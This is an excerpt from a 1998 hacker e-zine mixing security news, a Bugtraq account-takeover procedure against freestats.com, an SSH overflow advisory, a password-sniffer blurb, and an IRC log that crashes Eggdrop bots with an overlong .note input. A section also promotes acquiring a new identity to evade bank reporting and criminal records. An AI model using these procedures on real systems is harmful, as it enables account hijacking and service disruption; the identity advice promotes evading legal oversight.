+    From the website: http://www.trinux.org/
+
+     "Trinux is a portable Linux distribution that boots from 2-3
+      floppies (or a FAT 16 partition) and runs entirely in RAM.
+      Trinux contains the latest versions of popular network
+      security tools and is useful for mapping and monitoring
+      TCP/IP networks.
+
+      Trinux transforms an ordinary x86 PC into a powerful
+      network [security] management workstation without
+      modifying the underlying hardware or operating system.
+      The default configuration uses a stripped down version
+      of kernel 2.0.35 that should boot on any 386 or better
+      with at least 12-16 megabytes of RAM. Hardware
+      support for NICs is provided through kernel modules
+      which may be downloaded and copied to the boot medium"
+      
+      
+    @HWA
+
+
+5.1  Getting a new identity.
+     ~~~~~~~~~~~~~~~~~~~~~~~
+
+     Reference: http://offshoreprofit.nu/identity/index.html
+
+     There are some very good reasons (other than the obvious) for seeking
+    out and aquiring a new identity. These include messy divorces, criminal
+    records and tax problems, you don't want all that bad history following
+    you around wherever you go now do you?. In the U.S.A all bank transactions
+    are recorded and available for scrutiny by firms or private investigators
+    etc..
+
+     "Did you know that if you transfer amounts of over $10,000 (often
+      already if you transfer amounts over $3,000), your friendly banker
+      will report you to a semi-secret government agency called FinCEN
+      for possible money laundering investigations?"
+
+     Surprised? you shouldn't be, the US and Canada are more communist than
+    Russia ever was in many ways, only difference here is that you're given
+    a cleverly sugared illusion of freedom, ask someone from the ex-USSR or
+    Serbia, Croatia, Macedonia etc ... they've lived under communist rule
+    for years.
+    
+    @HWA
+
+     
+5.2  Credit Card Phraud
+     ~~~~~~~~~~~~~~~~~~
+
+    Source: Published Sunday, December 6, 1998, in the San Jose Mercury News
+
+    CARD RISK
+ 
+    There are many real threats to consumers' credit cards, but few are
+    unique to the Internet. Most crimes involve poor security by a merchant
+    or scams in which consumers give their number to a stranger. And
+    credit card users face these risks regardless of where they use their
+    card.
+
+    April 1995: Hackers began disrupting service at America Online using
+    a widely disseminated program called AOHell. Some posed as AOL
+    employees to hoodwink customers into divulging their credit card
+    numbers. AOL defeated the program and began spreading the
+    following warning: ``Reminder: AOL staff will never ask for your
+    password or billing information.''
+
+    September 1995: Federal authorities accused two Berkeley hackers
+    of breaking into a computer system for Tower Video stores and
+    stealing about 2,000 credit card numbers. While the alleged crime
+    occurred online, Tower collected the numbers in normal retail
+    transactions.
+ 
+    November 1996: Someone stole a laptop computer from the Foster
+    City offices of Visa International containing information on about
+    314,000 Visa, MasterCard, American Express, Discover and Diner's
+    Club accounts. The criminal was apparently interested in the computer
+    and never used any of the cards, a Visa spokesman said.
+
+    April 1997: A computer containing financial information for 3,000
+    CalTrain customers was stolen from a Santa Clara depot. It contained
+    financial data on 2,500 customers who bought their tickets with checks
+    and 500 who charged their tickets to their credit cards.
+
+    May 1997: The FBI arrested a man trying to sell 100,000 credit card
+    numbers stolen from the computers of a San Diego Internet service
+    provider. Any credit card database that's connected to a
+    communications network -- as virtually all are -- faces similar risk.
+
+    November 1997: Four teenagers hacked into an Internet service
+    provider and gained access to the records of an unidentified Internet
+    auction house, where they obtained credit card numbers they later used
+    to buy computer equipment.
+
+    Source: Mercury News reporting
+    
+     @HWA
+
+6.0  Packet Storm Security is in trouble!
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+   Yet another fantastic site may fall due to POPULARITY, yeah you read
+   that right, tattooman's site (aka Ken Williams) is currently running
+   on the genocide2600 servers, the following is quoted directly from
+   the site:
+
+   "IMPORTANT NOTICE: Packet Storm Security's Web Site is in financial
+    trouble! Due to the increasing popularity of this web site, we are now
+    averaging over 80,000 hits/day, and double that figure on some days. We
+    have been doing over 4 GB/day in transfers, with all of the numbers going
+    up every week. This web site has recently grown to over 1.2GB, and is
+    getting larger every day. Our current contracts for webhosting and
+    Internet connectivity expire on 12/31/98. We have been advised that our
+    service rates will increase by at least 300% for the first quarter of 1999.
+    After shopping around, we have been quoted figures of $1500-8000/month to
+    host this web site by other companies and service providers. Since this
+    site is free (on principle), and we do not offer advertising (on principle),
+    we pay for it ourselves. The problem we now face is that we cannot afford
+    such steep increases. If you have any viable solutions or suggestions, then
+    please contact us ASAP. Email us at packetstorm@genocide2600.com, or for
+    secure encrypted communications, use our PGP keys and
+    mail us atjkwilli2@unity.ncsu.edu. "
+    
+     @HWA
+
+6.1  Latest exploits and hacks
+     ~~~~~~~~~~~~~~~~~~~~~~~~~
+
+     Source credit:-> BUGTRAQ
+
+     Approved-By: aleph1@DFW.NET
+     Date: 	Sat, 21 Nov 1998 12:54:41 -0500
+     Reply-To: John Carlton <techhelp@ROCKETMAIL.COM>
+     Sender: Bugtraq List <BUGTRAQ@netspace.org>
+     From: John Carlton <techhelp@ROCKETMAIL.COM>
+     Subject:      Freestats.com CGI vulnerability
+     To: BUGTRAQ@netspace.org
+
+     About a year ago I developed an exploit for the free web stats services
+     offered at freestats.com, and supplied the webmaster with proper code to
+     patch the bug.  After hearing no reply, and seeing no fix in sight, I've
+     decided to post it here.
+
+     Procedure:
+
+     Start an account with freestats.com, and log in.  Click on the area that
+     says "CLICK HERE TO EDIT YOUR USER PROFILE & COUNTER INFO"  This will call
+     up a file called edit.pl with your user # and password included in it.
+    
+     Save this file to your hard disk and open it with notepad.  The only form
+     of security in this is a hidden attribute on the form element of your account
+     number.  Change this from *input type=hidden name=account value=your#* to
+     *input type=text name=account value=""*  Save your page and load it into your
+     browser.
+
+     Their will now be a text input box where the hidden element was before.
+     Simply type a # in and push the "click here to update user profile" and all
+     the information that appears on your screen has now been written to that user
+     profile.
+
+     But that isn't the worst of it.  By using frames (2 frames, one to hold this
+     page you just made, and one as a target for the form submission) you could
+     change the password on all of their accounts with a simple JavaScript function.
+
+     Any thoughts, questions, or comments?
+
+     John Carlton,
+     CompSec specialist.
+
+     Source credit:-> [ http://www.rootshell.com/ ]
+
+    Date:         Thu, 5 Nov 1998 02:38:51 +0200
+    From:         Tatu Ylonen <ylo@SSH.FI>
+    Organization: SSH Communications Security, Finland
+    Subject:      security patch for ssh-1.2.26 kerberos code
+
+    -----BEGIN PGP SIGNED MESSAGE-----
+
+    This message contains information relevant to people who compile ssh
+    with --with-kerberos5.  There is one or more potential security
+    problem in the Kerberos code.  These issues are not relevant for
+    people who have not explicitly specified --with-kerberos5 on the
+    configure command line.
+
+    Peter Benie <pjb1008@cam.ac.uk> found a buffer overflow in the
+    kerberos authentication code.  To quote from his mail:
+
+    > What about sshconnect.c, line 1139
+    >
+    >     sprintf(server_name,"host/%s@", remotehost);
+    >
+    > where remotehost is (char *) get_canonical_hostname() (up to 255 chars),
+    > is copied into server_name (a 128 char buffer)?
+ 
+    It looks to me like this is a genuine buffer overflow.  I had not
+    noticed it when going through the code.
+ 
+    This buffer overflow is, however, extremely hard to exploit:
+
+    1. The victim must have have client compiled with --with-kerberos5 and
+       --enable-kerberos-tgt-passing.
+    2. The victim must be connecting to a server running with the same
+       options (i.e., krb5 with tgt passing).
+    3. You must do the following DNS spoofing:
+       - fake reverse map for the *server*
+       - fake forward map for the fake reversed name
+    4. You must fake your attack code to look like valid DNS records; this
+       is highly untrivial with modern versions of bind that reject all
+       domain names with invalid characters in them.
+    5. Only the part of the DNS name beyond 128 bytes can be exploited; that
+       must be made to align with stack frames and must contain appropriate
+       return addresses and jump addresses.  It has been shown that this can
+       generally be done, but the space and structural constraints here are
+       extremely tight compared to most instances of buffer overflow
+       exploits.
+    6. Since the client with Kerberos TGT passing is only used
+       interactively, the user will almost certainly notice that something
+       went wrong.  I don't think you can, within the structure and space
+       constraints, construct the code so that the user would not notice at
+       least the client crashing.
+    7. You cannot try again after a failed attack until the client again
+       tries to log into the same host.
+
+    This might yield an attack against the *client*.
+
+    I've fixed this in the source tree.
+
+    I'd like to thank Peter for reporting this.  A fix will be included in
+    the next release (which I expect in about a week).
+ 
+    <patch deleted for brevity>
+
+    - --
+    SSH Communications Security           http://www.ssh.fi/
+    SSH IPSEC Toolkit                     http://www.ipsec.com/
+    Free Unix SSH                         http://www.ssh.fi/sshprotocols2/
+
+    -----BEGIN PGP SIGNATURE-----
+    Version: 2.6.3i
+    Charset: noconv
+
+    iQCVAwUBNkDyOakZxfGWH0o1AQGYOQP/bUNnE/ZpSQqWVc0ngxLG50+CtyksugLJ
+    wD0X2yIoc8jmY+UNPL7weQatgv6CmUUoWWpLctzKr8A6G/HrD2sh0OHPBwhIxg1i
+    3mPj7WrcIX9g/K5LaEksiZ0vv4h/gvSJty5y+wRiu0QLRmuAy91CyaKTV7Sab0YT
+    /W/s1NazNIg=
+    =iABB
+    -----END PGP SIGNATURE-----
+  
+    
+     @HWA
+
+6.2  cDc releases new ButtSniffer
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+     Blurb from the cDc website:
+ 
+     http://www.cultdeadcow.com/~dildog/BUTTSniffer/
+
+     BUTTSniffer Prerelease 0.9.3 Public Beta Release
+
+     Description:
+
+     BUTTSniffer is a packet sniffer and network monitor for Win95, Win98
+     and also Windows NT 4.0. It works as a standalone executable, and as
+     plugin for Back Orifice. Want to know what's really going on on your
+     network segment? You need BUTTSniffer.
+
+     It features the following:
+
+     o TCP Connection monitoring. Full and split screen. Text and Hexadecimal
+       views.
+
+     o Password sniffing. Full phrasecatcher built in. Currently supports HTTP
+       basic authentication, FTP, Telnet, POP2 and POP3.
+
+     o Support pending for IMAP2, RLogin, and possibly other protocols Packet
+       filtering. Firewall style filtering lists. Exclude/include ranges of IP
+       addresses and ports.
+
+     o Multiple interface support. Can be started on any of the system's network
+       interfaces. Multiple instances of BUTTSniffer can be run at the same time.
+
+     o Interactive mode. Spawns a port that you can telnet to, and displays an
+       easy to use vt100 menu based user interface for remote sniffer access.
+
+     o War mode. War mode features include connection resetting. More features
+       to come!
+
+     o Win95, Win98, and Windows NT operating system support. Use it both at home
+       and at work!
+
+     <sic>
+     
+     
+     @HWA
+     
+
+6.3  BOFREEZE - Been orificed? freeze those buggers!
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+     If you have been bitten by BO theres a damn good chance you deserved it
+     but in case you're a hapless victim BOFreeze will bite people on the ass
+     that are running (or trying to run) BO on your system.
+
+     From the site:
+
+     "BO FREEZE is a program which listens on UDP port 31337 (or a port of
+     your choice - port 31337 since this is the default listening port for a
+     BO server) for BO client packets, all of which are encrypted with a 16
+     bit encryption key.  Each client packet, when it has been decrypted,
+     starts with this string:  *!*QWTY?
+
+     BO FREEZE can recognise not just one encrypted BO packet, not even 10 or
+     100 - not even 1000 - but ALL 65536 (that's 216) different possible
+     encrypted BO client packets!!!  This means that regardless of what pass
+     word is used at the BO client end, BO FREEZE can still recognise a BO
+     packet when it sees one!  So what is the point of all this?  And why is
+     the program called BOFREEZE?
+
+     Quiet simply, cDc (Cult of the Dead Cow - the hacking organisation who
+     created BO) did not write very good code in their BO GUI (and command
+     driven) BO client.  As a result, WZC Productions has found that sending
+     malformed data packets back to the client using the correct encryption
+     key causes major problems for the BO client user.  With the command
+     driven client, strange and fabulous characters appear on the screen
+     (effectively disabling the client completely because its packet buffer
+     becomes full) and with the GUI client - that just freezes up
+     completely!!!
+
+     The point is this.  All that is needed is 1 person in 254 on the net to
+     be running BO FREEZE (liken this to your computer being the "bad apple"
+     in a bag of apples) and it will cause major problems for people who
+     perform ping sweeps, trying to track down computer systems with BO
+     installed on them!
+
+     BOFreeze page: http://members.xoom.com/wzc/bof/main.html
+     
+
+    @HWA
+    
+
+
+7.0 HackingIRC'98 (Part 1) -- WARNING! Patch your eggdrops!
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    * This is an excerpt from the HackingIRC'98 textfile by Cruciphux
+
+    Prologue
+    ~~~~~~~~
+
+     IRC is a joke yes we all know that, BUT for some insane reason people
+    still tend to take it so serious, thats why we have ppl taking down entire
+    networks with smurf attacks coz joecool operator or mr'leet was nasty to
+    us .. anyways to add more mayhem or perhaps help clear some of it up I
+    wrote this text since most others are so out of date its not funny...
+
+    Crashing Eggdrop Bots
+    ~~~~~~~~~~~~~~~~~~~~~
+
+    The following will crash eggdrop bots: (Tested on version v1.3.8) probably
+    works on 1.3.x I believe this one requires that TCL be *enabled*.
+
+    You MUST have access to the bot (regardless of level) in order for most
+    of the current known overflows to work. These will merely cause the egg
+    to die with a segfault error.
+
+   *** sk00bi (sk@some.leethost.org) has joined channel #leetchan
+   *** You are now talking to channel #leetchan
+   >/t
+   332 Topic for #leetchan: ---=[ We're so fucking leet its not funny. ]=---
+   333 The topic was set by GoatBoi 48413 sec ago
+   > w00p
+   > awpz
+   *** Mode change "+o sk00bi" on channel #leetchan by KKl0wn
+   <KKl0wn> whatup?
+   *kkl0wn*> gimme bot axs? I have a mad sploit to upload ...
+   *KKl0wn* k. hang a sec ...
+   > k
+   *KKl0wn* pass is freekevin
+   > ha
+   <KKl0wn> ;)
+   *** Sent DCC CHAT request to leetb0t
+   *** DCC chat connection to leetb0t[129.x.x.x:xxxx] established
+   =leetb0t= Enter your password.
+   => =leetb0t= hax0r98
+   =leetb0t= Negative on that, Houston.
+   *** DCC CHAT connection to leetb0t lost [Remote End Closed Connection]
+   *** Sent DCC CHAT request to leetb0t
+   *** DCC chat connection to leetb0t[129.x.x.x:xxxx] established
+   =leetb0t= Enter your password.
+   => =leetb0t= freekevin
+   =leetb0t= Connected to leetb0t, running Eggdrop v1.3.8  (c)1997 Robey Pointer
+   =leetb0t=     ____                __
+   =leetb0t=    / __/___ _ ___ _ ___/ /____ ___   ___
+   =leetb0t=   / _/ / _ `// _ `// _  // __// _ \ / _ \
+   =leetb0t=  /___/ \_, / \_, / \_,_//_/   \___// .__/
+   =leetb0t=       /___/ /___/                 /_/
+   =leetb0t=            ___    ____
+   =leetb0t=           <  /   |_  /
+   =leetb0t=           / /_  _/_ <
+   =leetb0t=          /_/(_)/____/ (c) Robey Pointer 1997
+   =leetb0t=
+   =leetb0t= Hey sk00bi! My name is leetb0t and I am running eggdrop v1.3.8, on FreeBSD 3.0-980520-SNAP.
+   =leetb0t= Local time is now ^B05:31^B
+   =leetb0t= Commands start with '.' (like '.quit' or '.help')
+   =leetb0t= Everything else goes out to the party line.
+   =leetb0t= You have no messages.
+   =leetb0t= *** sk00bi joined the party line.
+   => =leetb0t= .who
+   =leetb0t= [05:31] #sk00bi# who
+   =leetb0t= Party line members:  (* = owner, + = master, @ = op)
+   =leetb0t=   +sk00bi sk@some.leethost.org (con:mkcobxs)
+   => =leetb0t= gr0nk
+   =leetb0t= <sk00bi> gr0nk
+   => =leetb0t= this b0t is h1st0ry
+   =leetb0t= <sk00bi> this b0t is h1st0ry
+   =leetb0t=.note aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dummy
+   =leetb0t= [08:22] * Last context: tclhash.c/509
+   =leetb0t= [08:22] * Wrote DEBUG
+   =leetb0t= [08:22] * SEGMENT VIOLATION -- CRASHING!
+   *** DCC CHAT connection to leetb0t lost [Remote End Closed Connection]
+   *** Signoff: leetb0t (EOF From client)
+   <KKl0wn> pfft.
+   > nice huh?
+   <KKl0wn> yeah goody.
+   > might wanna fix that ...
+   >/quit patch yer bots!
+   End session 08:23
+
+
+   There are other buffer overrun conditions in current eggdrops but no,
+   I'm not going to release them here.(yet...)
+   
+    @HWA
+    
+
+7.1  Hacked Web Sites: The latest 'fun thing to do?'
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     You know, I have a problem with the current trend of hacking websites
+    and pages, especially when the perps do not leave a backup of the
+    original site intact. It seems that in order for some to 'prove'
+    themselves they need to hack a page and greet all their friends, their
+    dog and their bum buddies.
+
+     At one time it actually meant something, sites were hacked to purvey a
+    message of socio-political or purely political importance, sites were
+    hacked to prove major security flaws existed that were being denied by
+    security "experts" or product pushers, nowadays its no more significant
+    than spray paint on a wall. Having said all that I still believe the
+    socio-political 'righteous' hacks have a place, but if you're a newbie
+    looking for fame, word up, you'll just end up in the flamers hall of
+    lame, the net never forgets. - Ed
+
+
+    "You think its anarchy when you trash our halls?, trash a bank
+    if you've got real balls" - The Dead Kennedy's
+
+
+    Some bullshit site hacks:
+    ~~~~~~~~~~~~~~~~~~~~~~~~
+
+    ie: Try searching for 'this site has been hacked' on webcrawler ;-)
+
+    http://www.angelfire.com/ma/usmarine/index.html
+    <Rest of list deleted - no fame for the lame>
+
+    Its cool to bite the hand that feeds you?
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    http://www.rootshell.com/
+    http://www.hack-net.com/
+
+    http://www.cyberarmy.com/  Dec 9th
+    Mirror of hack:
+    http://www.bikkel.com/~demoniz/hacksite/cyberarmy.html
+
+
+    Hacks actually worth reporting that carry some meaning(?):
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    Rotterdam Art Institute hacked
+    http://www.bikkel.com/~demoniz/hacksite/hro_nl.html
+
+    The Tianjin City Network of Information of Science & Technology
+    http://www.bikkel.com/~demoniz/hacksite/china.htm
+    Story:http://www.wired.com/news/news/politics/story/16545.html
+
+    Packard Bell Computers
+    http://www.sekurity.8m.com/haxxor.html
+
+    There have been SO many websites hacked lately its almost useless
+    and certainly boring following them all, if you want though I will
+    chronicle them here, email me your opinion. Meanwhile these sites
+    do a good job of archiving old and new hacked websites:
+    (2600 even has a section for fake hacked sites .*shrug* ..)
+
+    http://www.freespeech.org/resistance/index.htm (Good site)
+    http://www.2600.com/hacked_pages/
+    http://www.onething.com/archive/ ** Censored! (???)
+
+
+    @HWA
+    
+   
+8.0  ROOTFEST'99
+     ~~~~~~~~~~~
+
+    RootFest will be May 21-23, 1999 in Minneapolis, MN
+    http://www.rootfest.org/
+
+    Speakers                      Topic
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    Bruce Schneier .............. To be announced.
+    Who are they?: Published author,  Counterpane president
+    Steve Stakton (Optiklenz).... cisco pix firewall security analysis
+    Who are they?: Legions Interactive founder
+    Adam L. Beberg .............. v3 security(tentative)
+    Who are they?: Distributed.net founder
+    Konceptor ................... Monitoring IRC, evading capture ,
+                                  Naval Surface Warfare Center
+    Who are they?: U.S. Hacker
+    Mike Roadancer .............. "Hacker - It's not a dirty word"
+                                  Hackers in the workplace
+    Who are they?: President, Hacker's Defense Foundation
+    Brian Ristuccia.............. ideas on Internet censorship
+    Who are they?: Bay Networks contractor
+    Paul McNabb...................Trusted Operating Systems Technology
+                                  in Web-based computing
+    Who are they?: CTO of Argus Systems Group, Inc.
+    Brenno J.S.A.A.F. de Winter ..Internet Security in Europe - State of Affairs
+    Who are they?: Netherlands Hacker
+    Data Shark....................TEMPEST and how to prevent it.
+    Who are they?: System Administrator, hacker
+    
+    
+    Please send corrections, or 'CON' announcements to hwa@press.usmc.net
+    thanks.
+
+    @HWA
+    
+
+9.0  PHACVW, sekurity, security, cyberwar and referenced links
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    Cool site of the month:
+    ~~~~~~~~~~~~~~~~~~~~~~~
+
+    Site....: PacketStorm Security
+    Run by..: Ken Williams
+    Alias...: tattooman
+    URL.....: http://www.genocide2600.com/~tattooman/
+    Comment.: More stuff than you can shake a stick at, and current.
+    Rating..: ***** 5/5
+    Reviewer: Ed.
+
+    Honourable mentions:
+    ~~~~~~~~~~~~~~~~~~~~
+    HiR:Hackers Information Report... http://axon.jccc.net/hir/
+    Backdoor and other trojans+ ..... http://www.ufl.edu/~cycy92n/des/zemacs/
+
+
+    Top 10/50/100/1000 etc lists:
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    http://www.webfringe.com/top100?
+    http://www.hitbox.com/wc/world.100.HackingPhreaking.html
+    http://www.tazzone.com/top500/tally.cgi?section1=Hacking_Phreaking
+    http://www.splitinfinity.com/~top55/
+    http://www.linkz.net/cgi-bin/top250/
+
+    Misc:
+    ~~~~
+    http://www.cen.uiuc.edu/~ejk/browser-security.html ... Security
+    http://www.hackcanada.com/ ..........Canadian phreak site
+    http://www.ufl.edu/~cycy92n/........ PHAC site - trojan files
+    http://www.cyberarmy.com/search/  .. PHACV search engine
+    http://www.phorce.net/ ............. IRC War and takeover news etc
+    http://www.legion2000.org/hcvorg/ .. Trojans and PHAC
+    http://www.born2hack.com/ .......... PHAC Site
+    http://www.hellsroot.org/ .......... PHAC Site
+    http://www.deltasitez.nu/index.html .PHAC Site
+    http://www.theargon.com/.............PHAC Site
+
+    Historic:
+    ~~~~~~~~
+    http://www.savage.net/ Annaliza Savage's home page
+    http://www.kevinpoulsen.com/ Kevin Poulsen's home page
+    http://catalog.com/kevin/ KP's mirror site (aka The Switch Room)
+    http://home.pacbell.net/sysadm/ Agent Steal's home page
+
+
+    Commercial:
+    ~~~~~~~~~~~
+    http://lockdown2000.com/demo/start.html .. "Hacker demo" (protection software)
+    http://www.calgate.net/shellorder.html  ... $50/yr shells(!)
+    http://www.hackershomepage.com/ ........... Hacker $tuff, Toolz/Warez
+
+    @HWA C*:.98
+
+  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-
+     --EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--EoF-HWA-EoF--
+  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-
+       [45:6E:64]-[28:63:29:31:39:39:38:20:68:77:61:20:73:74:65:76:65]
